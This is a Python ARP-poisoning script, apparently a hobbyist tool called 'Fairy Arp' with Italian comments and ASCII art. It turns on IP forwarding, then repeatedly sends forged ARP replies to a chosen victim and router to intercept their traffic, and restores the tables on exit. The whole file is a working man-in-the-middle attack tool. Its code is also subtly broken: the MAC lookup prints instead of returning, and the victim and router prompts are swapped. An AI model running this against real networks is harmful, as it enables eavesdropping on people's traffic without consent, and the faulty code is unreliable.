#!/usr/bin/env/
from termcolor import colored
import scapy.all as scapy
import time
import subprocess

subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

# inizio
print(colored("""

      .--.   _,                     
  .--;    \ /(_                   
 /    '.   |   '-._       . ' .         ･｡ ☆ﾟ.*･｡
|       \  \    ,-.)     -= * =-   .*･｡ﾟ☆ﾟARP☆ﾟ.*･｡ﾟ
 \ /\_   '. \((` .(       '/. '       ･｡☆ﾟ.  ･｡ﾟ
  )\ /     \ )\  _/      _/       
 /  \ \    .-'   '-.    /_\          
|    \ \_.' ,       \  / /
\     \_.-';,    /'\ \/ /        
 '.       /`\   (   '._/           
   `\   .;  |  . '.              
     ).'  )/|      \              
     `    ` |  \|   |              
             \  |   |               
              '.|   |              
                 \  '\__              
                  `-._  '. _          
                     \`;-.` `._        
                      \ \ `'-._\          
                       \ |           
                        \ )          
                         \_\                             
""", "green"))
print(colored("""
   ______    _                                  
  |  ____|  (_)                /\               
  | |__ __ _ _ _ __ _   _     /  \   _ __ _ __  
  |  __/ _` | | '__| | | |   / /\ \ | '__| '_ \ 
  | | | (_| | | |  | |_| |  / ____ \| |  | |_) |
  |_|  \__,_|_|_|   \__, | /_/    \_|_|  | .__/ 
                     __/ |               | |    
                    |___/                |_|   
by f4k3
""", "blue"))
time.sleep(0.5)

gateway_ip = input("Set the victim host ip >> ")
target_ip = input("Set the router ip >> ")
time.sleep(0.5)
print(colored("opening the potions!", "green"))
time.sleep(0.5)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)  # metto verbose per non far spawnnare una scritta ogni secondo


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)




try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2  # questo e figo
        print(colored("<> 🧪 Poison sent: " + str(sent_packet_count),
                      "green"))  # per sovrascrivere una linea (numero 1-2-3...) fare cosi print(("lnbaablblbaba"), end="")
        time.sleep(2)  # secondi
except KeyboardInterrupt:
    print(colored("  >< Detected CTRL + C", "blue"))
    time.sleep(0.5)
    print(colored(" ...closing the potions... ☆ﾟ.*･｡ﾟ resetting ARP table...", "green"))
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    time.sleep(0.5)
    print(colored("""
     ﾟ.*･｡ﾟ.*･｡ﾟ☆ﾟ.*･｡☆ﾟ.*･｡ﾟ☆ﾟ.*･
    ☆ﾟ.ﾟpotions are closed!!!☆ﾟ.*
     ﾟ.*･｡ﾟ.*･｡ﾟ☆ﾟ.*･｡ﾟ.*･｡ﾟ☆ﾟ *･｡ﾟ
    """, "green"))